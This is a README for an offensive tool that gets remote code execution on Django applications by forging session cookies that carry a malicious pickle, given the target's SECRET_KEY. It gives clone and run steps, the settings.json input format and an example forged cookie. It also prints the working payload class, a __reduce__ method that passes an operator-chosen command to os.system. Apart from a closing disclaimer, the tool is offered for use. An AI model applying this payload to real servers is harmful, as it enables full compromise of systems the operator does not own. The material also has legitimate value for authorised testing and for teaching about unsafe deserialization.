# Django Pickle RCE Exploit Tool

This tool exploits Django's use of `PickleSerializer` for session cookies, enabling remote code execution (RCE) through a forged cookie. 

## Prerequisites

- Python 3.x
- Django installed
- Knowledge of the target system’s Django settings, specifically the `SECRET_KEY` and a valid cookie.

## How It Works

The exploit works by:

1. Extracting the `SECRET_KEY` and a valid session cookie from the target Django project’s settings.
2. Forging a new session cookie that contains a malicious Pickle object.
3. The malicious payload (`PickleRce`) executes a system command when the server deserializes the cookie.

### Exploit Flow:

- **Step 1:** Load Django settings from a `settings.json` file.
- **Step 2:** Extract the `SECRET_KEY` and the target session cookie.
- **Step 3:** Deserialize the cookie, inject a malicious Pickle payload (`PickleRce`), and re-serialize it.
- **Step 4:** Output the forged session cookie, which can be used to trigger the payload.

## Usage

1. Clone the repository:

   ```bash
   git clone https://github.com/Spix0r/django-rce-exploit.git
   cd django-rce-exploit
   ```

2. Prepare your `settings.json` file with the following format:

   ```json
   {
       "settings": [
           {
               "SECRET_KEY": "your_secret_key",
               "Sites_COOKIE": "your_cookie_value"
           }
       ]
   }
   ```

   - Replace `"your_secret_key"` with the target Django application's secret key.
   - Replace `"your_cookie_value"` with the cookie you want to forge.

3. Run the exploit:

   ```bash
   python3 exploit.py
   ```

   If successful, the script will output a forged cookie that can be used to trigger remote code execution.

## Example

```bash
Forged cookie:
gAJ9cQAoWAMAAAB0ZXN0Y29va2llcQFLAUsALg==
```

You can then send this forged cookie to the Django server to trigger the command injection.

## Customizing the Exploit

By default, the payload executes the command `"YOUR OS COMMAND HERE"`. To customize this, modify the `PickleRce` class in the script:

```python
class PickleRce(object):
    def __reduce__(self):
        return (os.system,('YOUR_OS_COMMAND',))
```

## Disclaimer

This tool is for educational purposes only. Use it responsibly and only on systems you have permission to test.

## License

This project is licensed under the MIT License.
